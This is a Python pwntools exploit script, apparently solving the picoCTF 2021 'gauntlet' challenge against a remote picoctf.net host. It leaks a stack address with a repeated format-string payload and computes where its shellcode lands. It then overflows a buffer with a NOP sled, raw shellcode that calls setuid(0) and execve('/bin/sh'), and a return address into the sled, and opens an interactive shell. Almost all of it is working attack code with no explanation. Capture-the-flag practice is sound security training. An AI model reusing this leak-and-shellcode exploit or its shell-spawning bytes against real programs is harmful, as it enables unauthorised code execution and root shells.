from pwn import *

'''
[*] '/home/kali/Desktop/pico2021/gauntlet1/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

1) printf returns a stack address = 0x7fffffffe4b0

2) fgets size of 0x3e8 0x6022a0

3) fgets size of 0x3e8 0x6022a0


'''
local_bin = "./gauntlet"
elf = ELF(local_bin)
rop = ROP(elf)

p = remote("mercury.picoctf.net",59636)
#p = process(local_bin)
#p = gdb.debug(local_bin, '''
    #break main
    #break *main+78
    #break *main+117
    #break *main+149
    #continue
    #''')

'''
rsp is at 0x7fffffffe528

'''
sleep(2)

context.os = 'linux'
context.arch = 'amd64'

#sc = asm(shellcraft.amd64.linux.sh())

#print(len(sc))

payload1 = b'%qx '* (20)
p.sendline(payload1)

output = p.recvuntil(b"\n")
print(output)
print("[+] Leak = ", output)

leak = output[-0x10+2:-2]
print("[+] Working leak = ", leak)

leak = leak.decode("utf-8") 
leak = '0x' + leak
print("[+] Leaked stack address = ", (leak))

offset_shellcode = 0x7fffffffe610 - 0x7fffffffe4b0
shellcode_addr = int(leak,16) - offset_shellcode

print("[+] My shellcode is at ", hex(shellcode_addr))


shellcode = b'\x90' * (0x60 - 1 - 0x30)
shellcode += b'\x90'
#shellcode += b'\x48\x83\xc4\x08' #add rsp 8
shellcode += b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"

#jumping to main after that


shellcode += b'\x90' * (0x30 - 0x20 + 8) 

#return address have to +16
shellcode += p64(shellcode_addr + 16,endian='little')
p.clean()
p.sendline(shellcode)

p.interactive()